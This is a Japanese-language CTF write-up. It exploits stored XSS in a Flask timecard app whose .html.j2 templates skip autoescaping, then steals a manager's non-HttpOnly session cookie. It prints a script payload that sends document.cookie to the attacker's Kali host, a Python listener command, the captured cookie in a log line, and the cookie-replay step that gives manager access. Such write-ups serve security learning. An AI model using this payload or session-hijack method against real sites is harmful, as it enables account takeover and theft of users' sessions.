# writeup
問題文より、上司としてログインするとフラグが得られるとわかります。

## webサーバについて
最初に配布ファイルの`web/app.py`を見ます。

`create_initial_user()`があり、managerユーザとuserユーザがいます。この問題ではmanagerユーザとしてログインすることが目標となります。

`dashboard()`を見ると、`return render_template('manager_dashboard.html.j2', timecards=timecards, flag=FLAG)`と書かれています。`manager_dashboard.html.j2`という拡張子になっていることに着目します。

[Flaskのマニュアル](https://flask.palletsprojects.com/en/stable/templating/)によると、`autoescaping is enabled for all templates ending in .html, .htm, .xml, .xhtml, as well as .svg when using render_template().`と書かれていますが、どの拡張子にも当てはまっていません。このため、XSSの脆弱性が存在する可能性があります。timecards内にJavaScriptのコードを書くと、上司のブラウザで任意のコードを実行できる可能性があります。

timecardsは`submit_timecard()`で作成されています。これによると、timecardはフォームに入力された文字をそのまま入れているようです。ここで、`class TimeCard()`にて、型が定義されています。`remarks`は文字列（String）なので、自由に書けそうです。

`submit_timecard()`を実行するには`/submit_timecard`エンドポイントにアクセスします。このエンドポイントにアクセスするフォームは、`web/templates/employee_dashboard.html.j2`にあります。このファイルはemployeeの権限のアカウントで`/dashboard`にアクセスすると使用できます。これで、自作のJavaScriptを投稿することはできそうです。

また、`app.config['SESSION_COOKIE_HTTPONLY'] = False`と書かれているため、CookieをJavaScriptから読むことができます。

## victimサーバについて
配布ファイルの`victim/login_access.js`を見ると、`http://web/login`にアクセスし、managerのユーザ名とパスワードでログインしたうえで、`http://web/dashboard`にアクセスしているようです。
このことから、フォームの備考欄（`remarks`）にJavaScriptのコードを書くと、上司のブラウザで実行させることができそうです。


## XSSの利用

XSSでCookieを奪取するJavaScriptのコードを書きます。例えば以下のようなコードがあります。
```
<script>fetch("http://<Kali LinuxのIPアドレス>/".concat(encodeURIComponent(document.cookie)));</script>
```

ユーザ名：`user`、パスワード: `userpass`でログインし、上記のコードを備考欄に書いて申請します。

Kali Linuxのシェルにて以下のコマンドを実行します。

```
python3 -m http.server 80
```

1分ほど待つと、以下のような通信が届きます。

```
192.168.11.130 - - [19/Jun/2025 03:25:07] "GET /session%3D.eJwlzj0OwjAMQOG7eGawk_gnvUwVO7FgbemEuDuV2N7bvg_seazzCdv7uNYD9teEDZhb1ByyuJt3bx45EpnCjIthJS-cPYjVRGXWWTxJRtSpjUhceKbayOLBnk46UJth4v0LyboW68E4Rwms7W4RMSZjJtHocEOucx1_DcH3B6yOLmI.aFO7Tg.bpIvfeN9e25f-Etta3Ly_ibL8qg HTTP/1.1" 404 -
```

上記をURLデコードすると、`session=.eJwlzj0OwjAMQOG7eGawk_gnvUwVO7FgbemEuDuV2N7bvg_seazzCdv7uNYD9teEDZhb1ByyuJt3bx45EpnCjIthJS-cPYjVRGXWWTxJRtSpjUhceKbayOLBnk46UJth4v0LyboW68E4Rwms7W4RMSZjJtHocEOucx1_DcH3B6yOLmI.aFO7Tg.bpIvfeN9e25f-Etta3Ly_ibL8qg`が出てきます。

Webブラウザの開発者ツールにて、上記のCookieを書き込み、`http://<ターゲット1のIPアドレス>`にアクセスするとmanagerとしてログインした状態になります。このページにフラグが表示されています。
